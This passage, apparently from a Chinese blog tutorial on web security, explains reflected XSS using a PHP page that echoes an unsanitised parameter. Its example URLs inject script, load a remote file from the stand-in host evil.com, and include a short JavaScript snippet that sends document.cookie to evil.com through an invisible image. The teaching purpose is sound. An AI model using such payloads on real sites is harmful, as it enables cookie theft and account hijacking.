class="comment">//获取用户输入的参数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;b&gt;"</span>.$userName.<span class="string">"&lt;/b&gt;"</span>;                    <span class="comment">//直接输出用户的参数给前端页面</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正常情况下，用户提交的姓名可以正确显示在页面上，不会构成XSS攻击，比如，当用户访问以下URL：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/xssTest/test.php?userName=jack`</span><br></pre></td></tr></table></figure><p>页面会显示：<br><img src="https://img-blog.csdnimg.cn/2019103121021226.png" alt="1"><br>可以看到，用户在URL中输入的参数正常显示在页面上。然后，我们在URL中插入JavaScript代码，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/xssTest/test.php?userName=&lt;script&gt;window.open(http://www.baidu.com)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>则页面会显示：<br><img src="https://img-blog.csdnimg.cn/20191031210340900.png" alt="2"><br>可以看到，页面没有把userName后面的内容显示出来，而且打开了一个新的标签页,原因是在URL中带有一段打开另一标签页的恶意脚本。<br>这个例子体现了最简单的XSS攻击的完整流程。</p><h6 id="XSS-Payload"><a href="#XSS-Payload" class="headerlink" title="XSS Payload"></a>XSS Payload</h6><p>我们把进行XSS攻击的恶意脚本成为XSS Payload。XSS Payload的本质是JavaScript脚本，所以<strong>JavaScript可以做什么，XSS攻击就可以做什么。</strong><br>一个最常见的XSS Payload就是盗取用户的Cookie,从而发起Cookie劫持攻击。Cookie中，一般会保存当前用户的登录凭证，如果Cookie被黑客盗取，意味着黑客有可能通过Cookie直接登进用户的账户，进行恶意操作。<br>如下所示，攻击者先加载一个远程脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/xssTest/test.php?userName=&lt;scriipt src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>而真正的XSS Payload，则写在远程脚本evil.js中。在evil.js中，可以通过下列代码窃取用户Cookie：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img=document.createElement(<span class="string">"img"</span>);</span><br><span class="line">img.src=<span class="string">"http://www.evil.com/log?"</span>+escape(document.cookie);  </span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure><p>这段代码插入了一张看不见的图片，同时把document.cookie作为参数，发到远程服务器。黑客在拿到cookie后，只需要替换掉自身的cookie，就可以登入被盗取者的账户，进行恶意操作。</p><h6 id="参考文献来自于百度，csdn-博客园，个人博客站点等"><a href="#参考文献来自于百度，csdn-博客园，个人博客站点等" class="headerlink" title="参考文献来自于百度，csdn,博客园，个人博客站点等"></a>参考文献来自于百度，csdn,博客园，个人博客站点等</h6><h6 id="推荐文章-https-www-cnblogs-com-Renyi-Fan-p-9951407-html"><a href="#推荐文章-https-www-cnblogs-com-Renyi-Fan-p-9951407-html" class="headerlink" title="推荐文章 https://www.cnblogs.com/Renyi-Fan/p/9951407.html"></a>推荐文章 <a href="https://www.cnblogs.com/Renyi-Fan/p/9951407.html" target="_blank" rel="noopener">https://www.cnblogs.com/Renyi-Fan/p/9951407.html</a></h6>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
